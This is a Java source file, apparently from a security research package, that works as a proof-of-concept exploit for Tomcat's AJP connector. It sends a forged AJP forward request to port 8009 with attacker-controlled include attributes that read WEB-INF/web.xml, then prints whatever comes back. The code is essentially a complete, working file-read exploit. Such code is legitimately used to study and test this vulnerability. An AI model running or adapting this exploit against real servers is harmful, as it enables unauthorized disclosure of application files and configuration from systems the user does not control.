package com.anbai.sec.tomcat.ajp;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.Socket;
import java.net.URL;

public class AjpReader {

	public static void main(String[] args) throws Exception {
		// 目标主机、端口、访问地址
		String host   = "127.0.0.1";
		int    port   = 8009;
		String target = "/aaaa";


		// 三个攻击者可控的 attribute 属性
		String request_uri  = "/aaaada";
		String path_info    = "/web.xml";
		String servlet_path = "/WEB-INF";

		Socket                socket = new Socket(host, port);
		URL                   url    = new URL("http://" + host + ":" + port + target);
		ForwardRequestMessage m      = new ForwardRequestMessage(url, 2);

		// 设置属性
		m.addAttribute("javax.servlet.include.request_uri", request_uri);
		m.addAttribute("javax.servlet.include.path_info", path_info);
		m.addAttribute("javax.servlet.include.servlet_path", servlet_path);

		// 发送数据包
		m.writeTo(socket.getOutputStream());

		// 不想解析结果，直接断掉socket，简单粗暴打印内容
		socket.setSoTimeout(3000);
		try {
			BufferedReader rd = new BufferedReader(new InputStreamReader(socket.getInputStream(), "UTF-8"));
			String         str;
			while ((str = rd.readLine()) != null) {
				System.out.println(str);
			}
			rd.close();
		} catch (Exception ignored) {
		}
	}
}
